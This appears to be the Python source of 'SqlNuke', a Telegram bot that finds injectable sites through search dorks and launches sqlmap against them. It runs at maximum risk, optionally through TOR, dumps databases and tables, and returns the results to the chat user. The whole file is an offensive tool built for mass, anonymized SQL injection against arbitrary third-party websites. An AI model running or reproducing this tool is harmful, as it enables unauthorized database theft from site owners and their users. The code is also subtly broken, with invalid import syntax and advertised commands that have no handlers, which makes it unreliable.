#!/usr/bin/python
# -*- coding: utf-8 -*-
import time
import subprocess
import python-telegram-bot
import os
import urllib2
import re
import socket
import datetime
import threading
from urllib2 import urlopen
from alexa import Alexa
from config import token_id

banner = '''
        \xF0\x9F\x9A\x80Welcome to SqlNuke\xF0\x9F\x9A\x80
       \xF0\x9F\x92\x89[Version v2.0]\xF0\x9F\x92\x89

       _.-._
      ({  ` )
       ` |''   *BooOOm!*
    \xF0\x9F\x9A\x80
    \xF0\x9F\x92\xA5\xF0\x9F\x92\xA5
\xF0\x9F\x92\xA3\xF0\x9F\x92\xA3\xF0\x9F\x92\xA3\xF0\x9F\x92\xA3

-\xF0\x9F\x93\x9A Author  : Abhisek Kumar [netwrkspider]
-\xF0\x9F\x93\xAA Email   : netwrkspider@protonmail.ch
-\xF0\x9F\x8C\x8D Website : http://www.netwrkspider.org

Select the option :: `/help`

---------------------------------------------

'''
menu = '''
\xF0\x9F\x9A\xA5 \xF0\x9F\x9A\xA5 OPTIONAL \xF0\x9F\x9A\xA5 \xF0\x9F\x9A\xA5
6.  `/getdorklist` - Download the latest DorkList Data.
7.  `/torstart` - Start the TOR Network.
8.  `/torstop` - Stop the TOR Network.
9.  `/sqlidata` - Download the all SQLi Data.
10. `/meminfo` - Check the memory utilization.
11. `/cpuloadinfo` - Check the CPU Utilization.
12. `/checksqli`   - Check SQLi Running Process.
13. `/killsqli` - Kill all the sqli Running Process.
14. `/buy` - SQLnuKe Store.
'''

def nuke(msg):
    chat_id = msg['chat']['id']
    command = msg['text']

    print "Got Command : %s " %command

    # Welcome screen and help
    if command.startswith('help') or command.startswith('/help') or command.startswith('/start'):
        bot.sendMessage(chat_id, str(banner))
        bot.sendMessage(chat_id,'\xF0\x9F\x94\x90 SQLnuKe MENU: ')
        bot.sendMessage(chat_id,'1. [nukedork] Search the SQLi \xF0\x9F\x92\x89 | Usage eg: -> nukedork index.php?id=1\n')
        bot.sendMessage(chat_id,'2. [sqlgdork] Search the SQLi \xF0\x9F\x92\x89 with Google | Usage eg: -> sqlgdork about.php?id=1\n')
        bot.sendMessage(chat_id,'3. [sqlihack] Perform the SQLi \xF0\x9F\x92\x89 without TOR | Usage eg: -> sqlihack http|https://<url>\n')
        bot.sendMessage(chat_id,'4. [sqlitor]  Perform the SQLi \xF0\x9F\x92\x89 with TOR | Usage eg: -> sqlitor http|https://<url>\n')
        bot.sendMessage(chat_id,'5. BTC Rate : example -> btc usd or btc anycurrency')
        bot.sendMessage(chat_id, str(menu))
        return 0

    # Command processing functions
    def runoscmd(cmd):
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = process.stdout.read()
        error = process.stderr.read()
        process.stdout.close()
        process.wait()
        if error:
            return None
        return output

    def getMemoryInfo():
        output = runoscmd("`which free` -m")
        if output:
            memory_line = output.split("\n")[1].split()
            total_mem = "%s MB" % (memory_line[1])
            mem_used_value = "%s MB" % (memory_line[2])
            mem_free_value = "%s MB" % (memory_line[3])
            mem_used_percent = ("%.2f%s") % (((float(memory_line[2]) / float(memory_line[1])) * 100),"%")
            headers = ["total","used","free","used %"]
            values = [total_mem,mem_used_value,mem_free_value,mem_used_percent]
            return dict(zip(headers,values))
        else:
            return None

    def getLoadAverage():
        dict_headers = ["1min","5min","15min"]
        loadAverages = [("%.2f" % a) for a in os.getloadavg()]
        return dict(zip(dict_headers,loadAverages))

    def checkSqliProcess():
        process = subprocess.Popen("ps -eopid,cmd | grep 'sqlmap'" , shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = process.stdout.read()
        error = process.stderr.read()
        process.stdout.close()
        process.wait()
        if error:
            return None
        return output

    def killsqliProcess():
        process = subprocess.Popen("ps aux | grep 'sqlmap' | awk '{print $2}' | xargs kill -9", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = process.stdout.read()
        error = process.stderr.read()
        process.stdout.close()
        process.wait()
        if error:
            return None
        return 0

    def help():
        bot.sendMessage(chat_id, str("\xF0\x9F\x9A\xA5HELP MENU: `/help`\xF0\x9F\x9A\xA5"))

    def sqligoogle(dorkstring):
        sqligoogledork = "sqlmap -v 2 -g %s --user-agent=Windows --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --v --batch --level=5 --risk=3 --banner --is-dba --dbs --tables --technique=BEUST --output-dir=data/sqldump/" % dorkstring
        bot.sendMessage(chat_id, str("\xF0\x9F\x95\x97 please wait while we are doing SQLi \xF0\x9F\x92\x89"))
        subprocess.Popen(sqligoogledork.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(time.ctime())
        bot.sendMessage(chat_id, "We are doing SQLi \xF0\x9F\x92\x89 in background! ")
        bot.sendMessage(chat_id, "If you want to download the sqli \xF0\x9F\x92\x89 report for SQLi Sites, Please Execute : `/sqlidata` ")

    # Command handling logic
    if command.startswith('sqlgdork') or command.startswith('Sqlgdork'):
        sqligargu = command[9:]
        sqligoogle(sqligargu)
        help()
        return 0
    
    elif command == '/sqlidata':
        for file in os.listdir("data/sqldump"):
            if file.endswith(".csv"):
                if os.stat('data/sqldump/%s' % file).st_size != 0:
                    pass
                else:
                    pass
            else:
                if os.stat('data/sqldump/%s/log' % file).st_size != 0:
                    bot.sendMessage(chat_id, "Website SQLi \xF0\x9F\x92\x89 data for : %s" %file)
                    bot.sendDocument(chat_id, document=open("data/sqldump/%s/log" % file, 'rb'))
                else:
                    bot.sendMessage(chat_id, "Sorry we haven't found any SQLi \xF0\x9F\x92\x89 on : %s" %file )
        help()

    # BTC price
    elif command.startswith('btc') or command.startswith('Btc'):
        arg1 = command[4:]
        url = "https://www.google.co.in/search?q=bitcoin+to+" + arg1
        req = urllib2.Request(url, headers={'User-Agent': "Magic Browser"}) 
        con = urllib2.urlopen(req)
        Text = con.read()
        position = re.search("1 Bitcoin =", Text)
        res = float(Text[position.end():position.end() + 9])
        axx = '1 BTC : ' + str(res) + ' ' + arg1
        bot.sendMessage(chat_id, str(axx))
        help()
        return 0

    # SQLi dork
    elif command.startswith('nukedork') or command.startswith('Nukedork'):
        argu = command[9:]
        fdork = open("data/dorklist/userdorklist.txt", "a+")
        fdork.write("%s\n" % argu)
        fdork.close()
        sqldorkengine = "./sqlnukedork %s " % argu
        bot.sendMessage(chat_id, str("\xF0\x9F\x95\x97 please wait while we are doing SQLi \xF0\x9F\x92\x89"))
        subprocess.Popen(sqldorkengine.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(time.ctime())
        bot.sendMessage(chat_id, "We are doing SQLi \xF0\x9F\x92\x89 in background! ")
        bot.sendMessage(chat_id, "If you want to download the sqli \xF0\x9F\x92\x89 report for SQLi Sites, Please Execute : `/sqlidata` ")
        help()
        return 0

    # SQLi with TOR
    elif command.startswith('sqlitor') or command.startswith('Sqlitor'):
        url = command[8:]
        bot.sendMessage(chat_id, str("\xF0\x9F\x95\x97 Please Wait while we are doing SQLi with TOR\xF0\x9F\x92\x89"))
        sqlit = "./sqlmap --tor --url %s --threads 5 -v 2 --level=5 --risk=3 --batch --is-dba --dbs --tables --output-dir=data/sqldump/" % url
        subprocess.Popen(sqlit.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(time.ctime())
        bot.sendMessage(chat_id, "We are doing SQLi \xF0\x9F\x92\x89 in background! ")
        bot.sendMessage(chat_id, "If you want to download the sqli \xF0\x9F\x92\x89 report for SQLi Sites, Please Execute : `/sqlidata` ")
        help()
        return 0

    # SQLi without TOR
    elif command.startswith('sqlihack') or command.startswith('Sqlihack'):
        url = command[9:]
        bot.sendMessage(chat_id, str("\xF0\x9F\x95\x97 Please Wait while we are doing SQLi without TOR\xF0\x9F\x92\x89"))
        sqlithack = "./sqlmap --url %s --threads 5 -v 2 --level=5 --risk=3 --batch --is-dba --dbs --tables --output-dir=data/sqldump/" % url
        subprocess.Popen(sqlithack.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(time.ctime())
        bot.sendMessage(chat_id, "We are doing SQLi \xF0\x9F\x92\x89 in background! ")
        bot.sendMessage(chat_id, "If you want to download the sqli \xF0\x9F\x92\x89 report for SQLi Sites, Please Execute : `/sqlidata` ")
        help()
        return 0

    elif command == '/torstart':
        bot.sendMessage(chat_id, str("Starting TOR..."))
        runoscmd("service tor start")
        bot.sendMessage(chat_id, str("TOR Started!"))

    elif command == '/torstop':
        bot.sendMessage(chat_id, str("Stopping TOR..."))
        runoscmd("service tor stop")
        bot.sendMessage(chat_id, str("TOR Stopped!"))

    elif command == '/meminfo':
        bot.sendMessage(chat_id, str(getMemoryInfo()))
        bot.sendMessage(chat_id, str(getLoadAverage()))
        help()
        return 0

    elif command == '/checksqli':
        bot.sendMessage(chat_id, str(checkSqliProcess()))
        help()
        return 0

    elif command == '/killsqli':
        killsqliProcess()
        bot.sendMessage(chat_id, str("All SQLi Processes killed!"))
        help()
        return 0

def main():
    global bot
    bot = python-telegram-bot.Bot(token=token_id)
    print('Listening for messages...')

    update_id = None
    while True:
        try:
            updates = bot.getUpdates(offset=update_id, timeout=10)
            for u in updates:
                update_id = u.update_id + 1
                nuke(u.message)

        except Exception as e:
            print(e)
            time.sleep(1)

if __name__ == '__main__':
    print(banner)
    main()
